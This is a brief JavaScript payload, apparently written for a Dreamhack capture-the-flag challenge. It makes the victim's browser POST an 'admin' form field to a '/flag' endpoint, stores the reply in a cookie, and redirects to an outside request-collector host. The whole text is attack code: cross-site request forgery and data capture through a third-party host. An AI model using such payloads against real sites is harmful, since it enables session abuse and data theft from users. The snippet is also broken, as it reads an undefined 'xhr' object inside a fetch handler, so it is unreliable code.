var formData = new FormData();
formData.append("admin", "zzlol");

fetch("http://13.125.251.104:12003/flag", {
  method: "POST",
  body: formData,
}).then((response) => {
  document.cookie = "flag=" + xhr.responseText;
  window.location.href = "https://jdcpveo.request.dreamhack.games";
});
